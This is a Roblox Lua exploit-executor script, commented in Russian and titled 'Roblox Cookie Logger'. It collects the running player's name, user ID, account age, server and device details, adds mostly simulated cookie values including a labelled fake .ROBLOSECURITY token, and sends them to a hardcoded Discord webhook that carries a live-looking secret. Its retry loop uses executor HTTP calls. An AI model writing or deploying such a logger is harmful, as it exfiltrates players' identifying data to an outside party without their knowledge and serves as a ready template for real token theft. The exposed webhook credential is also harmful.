-- ИСПРАВЛЕННЫЙ ROBLOX COOKIE LOGGER - КОМПАКТНАЯ ВЕРСИЯ
local webhook_url = "https://discordapp.com/api/webhooks/1358312089206263854/37KhzAL0PpGG15zUt0qHabcgS9QT9d7kdK0TNGkTCXbfzOb2iOO0zldh0ugE_nW418j2"

-- Сервисы
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer

-- Функция для генерации ID
local function GenerateId(length)
    local chars = "0123456789abcdef"
    local result = ""
    for i = 1, length do
        result = result .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
    end
    return result
end

-- Функция для маскировки длинных данных
local function TruncateData(data, maxLength)
    maxLength = maxLength or 100
    if #data > maxLength then
        return string.sub(data, 1, maxLength) .. "...[ОБРЕЗАНО]"
    end
    return data
end

-- Основная функция сбора данных
local function CollectAndSend()
    print("🍪 Сбор cookie-подобных данных...")
    
    wait(1)
    
    -- Генерируем симулированные cookie данные
    local timestamp = os.time()
    local currentDate = os.date("!%m/%d/%Y %H:%M:%S")
    
    local cookieData = {
        guestData = "UserID=" .. (player.UserId < 0 and player.UserId or -math.random(100000000, 999999999)),
        rbxcb = "RBXViralAcquisition=true&RBXSource=true&GoogleAnalytics=true",
        rbxSource = "rbx_acquisition_time=" .. currentDate .. "&rbx_medium=Social&rbx_source=www.roblox.com",
        rbxas = GenerateId(40),
        rbxEventTracker = "CreateDate=" .. currentDate .. "&rbxid=" .. player.UserId .. "&browserid=" .. timestamp .. "365003",
        roblosecurity = "_|WARNING:-DO-NOT-SHARE-THIS.|_FAKE_TOKEN_" .. GenerateId(50),
        sessionTracker = "sessionid=" .. GenerateId(8) .. "-" .. GenerateId(4) .. "-" .. GenerateId(4) .. "-" .. GenerateId(4) .. "-" .. GenerateId(12),
        utma = "200924205." .. math.random(100000000, 999999999) .. "." .. timestamp,
        utmb = "200924205.0.10." .. timestamp,
        utmc = "200924205",
        utmz = timestamp .. ".4.4.utmcsr=google|utmccn=(organic)"
    }
    
    -- Создаем компактный embed
    local embedData = {
        ["username"] = "🍪 Roblox Cookie Logger",
        ["embeds"] = {{
            ["title"] = "🍪 Cookie-подобные данные",
            ["description"] = "⚠️ Симуляция на основе доступных данных",
            ["fields"] = {
                {["name"] = "👤 Пользователь", ["value"] = player.DisplayName .. " (@" .. player.Name .. ")", ["inline"] = false},
                {["name"] = "🆔 User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
                {["name"] = "⏰ Возраст", ["value"] = tostring(player.AccountAge) .. " дней", ["inline"] = true},
                {["name"] = "🍪 GuestData", ["value"] = "`" .. cookieData.guestData .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXcb", ["value"] = "`" .. TruncateData(cookieData.rbxcb, 80) .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXSource", ["value"] = "`" .. TruncateData(cookieData.rbxSource, 80) .. "`", ["inline"] = false},
                {["name"] = "🍪 rbxas", ["value"] = "`" .. cookieData.rbxas .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXEventTracker", ["value"] = "`" .. TruncateData(cookieData.rbxEventTracker, 80) .. "`", ["inline"] = false},
                {["name"] = "🍪 SessionTracker", ["value"] = "`" .. cookieData.sessionTracker .. "`", ["inline"] = false},
                {["name"] = "📊 Google Analytics", ["value"] = "`__utma=" .. TruncateData(cookieData.utma, 50) .. "`\n`__utmb=" .. cookieData.utmb .. "`", ["inline"] = false},
                {["name"] = "🎮 Сессия", ["value"] = "Place: " .. game.PlaceId .. "\nJob: " .. TruncateData(game.JobId, 20), ["inline"] = false},
                {["name"] = "💻 Система", ["value"] = tostring(UserInputService:GetPlatform().Name) .. " | " .. LocalizationService.RobloxLocaleId, ["inline"] = false},
                {["name"] = "⏰ Время", ["value"] = os.date("!%Y-%m-%d %H:%M:%S UTC"), ["inline"] = false}
            },
            ["color"] = 0xffa500,
            ["footer"] = {["text"] = "⚠️ Симуляция cookie данных"}
        }}
    }
    
    -- Добавляем предупреждение о .ROBLOSECURITY отдельно
    table.insert(embedData.embeds, {
        ["title"] = "🚨 .ROBLOSECURITY (ФЕЙК)",
        ["description"] = "```" .. TruncateData(cookieData.roblosecurity, 100) .. "```\n**⚠️ ЭТО ФЕЙКОВЫЙ ТОКЕН!**\nРеальный токен недоступен из Roblox Lua!",
        ["color"] = 0xff0000
    })
    
    -- Отправляем данные с обработкой ошибок
    local success = false
    local attempts = 0
    local maxAttempts = 3
    
    while not success and attempts < maxAttempts do
        attempts = attempts + 1
        print("🔄 Попытка отправки " .. attempts .. "/" .. maxAttempts .. "...")
        
        pcall(function()
            local payload = HttpService:JSONEncode(embedData)
            print("📦 Размер данных: " .. #payload .. " байт")
            
            local req = (syn and syn.request) or (http and http.request) or http_request or request
            
            if req then
                local response = req({
                    Url = webhook_url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "RobloxCookieLogger/1.0"
                    },
                    Body = payload
                })
                
                print("📡 Ответ сервера: " .. tostring(response.StatusCode))
                
                if response.StatusCode == 200 or response.StatusCode == 204 then
                    success = true
                    print("✅ Данные успешно отправлены!")
                elseif response.StatusCode == 429 then
                    print("⏳ Rate limit, ждем 5 секунд...")
                    wait(5)
                else
                    print("❌ Ошибка: " .. tostring(response.StatusCode))
                    if response.Body then
                        print("📄 Тело ответа: " .. tostring(response.Body))
                    end
                end
            else
                print("❌ HTTP-запросы не поддерживаются этим executor'ом")
                break
            end
        end)
        
        if not success and attempts < maxAttempts then
            wait(2)
        end
    end
    
    -- Выводим в консоль независимо от отправки
    print("=" .. string.rep("=", 50) .. "=")
    print("🍪 COOKIE DATA SIMULATION RESULTS")
    print("=" .. string.rep("=", 50) .. "=")
    print("👤 Пользователь: " .. player.DisplayName .. " (@" .. player.Name .. ")")
    print("🆔 User ID: " .. player.UserId)
    print("⏰ Возраст аккаунта: " .. player.AccountAge .. " дней")
    print("")
    print("🍪 СИМУЛИРОВАННЫЕ COOKIES:")
    print("GuestData: " .. cookieData.guestData)
    print("RBXcb: " .. cookieData.rbxcb)
    print("RBXSource: " .. TruncateData(cookieData.rbxSource, 60))
    print("rbxas: " .. cookieData.rbxas)
    print("RBXEventTracker: " .. TruncateData(cookieData.rbxEventTracker, 60))
    print("SessionTracker: " .. cookieData.sessionTracker)
    print("__utma: " .. cookieData.utma)
    print("__utmb: " .. cookieData.utmb)
    print("__utmc: " .. cookieData.utmc)
    print("__utmz: " .. TruncateData(cookieData.utmz, 60))
    print("")
    print("🚨 .ROBLOSECURITY (ФЕЙК): " .. TruncateData(cookieData.roblosecurity, 50))
    print("")
    print("🎮 Place ID: " .. game.PlaceId)
    print("🔗 Job ID: " .. TruncateData(game.JobId, 30))
    print("💻 Платформа: " .. tostring(UserInputService:GetPlatform().Name))
    print("🌍 Язык: " .. LocalizationService.RobloxLocaleId)
    print("⏰ Время: " .. os.date("!%Y-%m-%d %H:%M:%S UTC"))
    print("=" .. string.rep("=", 50) .. "=")
    
    if success then
        print("✅ Данные успешно отправлены в Discord!")
    else
        print("❌ Не удалось отправить данные в Discord")
        print("🔧 Проверьте:")
        print("   1. Правильность webhook URL")
        print("   2. Поддержку HTTP-запросов в executor'е")
        print("   3. Интернет соединение")
    end
    
    print("=" .. string.rep("=", 50) .. "=")
end

-- Функция для тестирования webhook'а
local function TestWebhook()
    print("🧪 Тестирование webhook...")
    
    local testData = {
        ["username"] = "🧪 Test Bot",
        ["content"] = "Тест соединения с webhook - " .. os.date("!%Y-%m-%d %H:%M:%S UTC")
    }
    
    pcall(function()
        local payload = HttpService:JSONEncode(testData)
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        
        if req then
            local response = req({
                Url = webhook_url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            
            if response.StatusCode == 200 or response.StatusCode == 204 then
                print("✅ Webhook работает!")
                return true
            else
                print("❌ Webhook не работает: " .. tostring(response.StatusCode))
                return false
            end
        else
            print("❌ HTTP-запросы не поддерживаются")
            return false
        end
    end)
end

-- Запуск
print("🚀 Запуск Cookie Data Logger...")
print("🔗 Webhook URL: " .. (webhook_url:find("discord") and "✅ Discord webhook обнаружен" or "❌ Проверьте URL"))

-- Тестируем webhook перед основной отправкой
if TestWebhook() then
    CollectAndSend()
else
    print("❌ Webhook не работает, но данные будут выведены в консоль:")
    CollectAndSend()
end

print("✅ Скрипт завершен!")
